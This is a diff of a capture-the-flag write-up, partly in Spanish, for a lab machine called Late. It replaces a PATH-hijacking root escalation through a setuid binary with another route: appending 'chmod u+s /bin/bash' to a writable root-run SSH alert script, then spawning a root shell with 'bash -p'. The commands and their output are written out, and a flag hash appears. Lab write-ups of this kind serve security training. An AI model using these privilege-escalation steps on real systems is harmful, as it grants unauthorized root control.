@@ -33,24 +33,47 @@ user.txt
 
 751d3067405551fd209e7b3422ad24aa > root.txt
 
-[+]PATH HIJACKING TO ROOT[+]
+[+]SUID ROOT[+]
 Writable folder: /dev/shm
+ejecución pspy
+https://link.zhihu.com/?target=https%3A//github.com/DominicBreuker/pspy
+script de tarea cronometrado aquí:
+/usr/local/sbin/ssh-alert.sh
 
-svc_acc@late:~$ cat app.c 
-#include <stdio.h>
-void main(){
-	setuid(0);
-	system("/usr/bin/head /root/root.txt");
-	system("head /root/root.txt");
-	}
+#!/bin/bash
 
-svc_acc@late:/dev/shm$ gcc app.c -o app
-svc_acc@late:/dev/shm$ chmod u+s app
-svc_acc@late:/dev/shm$ export PATH=.:$PATH
-svc_acc@late:/dev/shm$ echo 'bash -p' > head
-svc_acc@late:/dev/shm$ chmod +x head 
-svc_acc@late:/dev/shm$ ./app
-#root.txt
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+
+
+Verifique los permisos aquí, podemos escribir el contenido en él
+
+echo "chmod u+s /bin/bash" >> /usr/local/sbin/ssh-alert.sh
+exit
+ssh svc_acc@10.10.11.156 -i id_rsa
+-bash-4.4$ id
+uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+-bash-4.4$ bash -p
+bash-4.4# id
+
+bash-4.4# cat /root/root.txt 
+[+]root.txt[+]
+
 
 
 
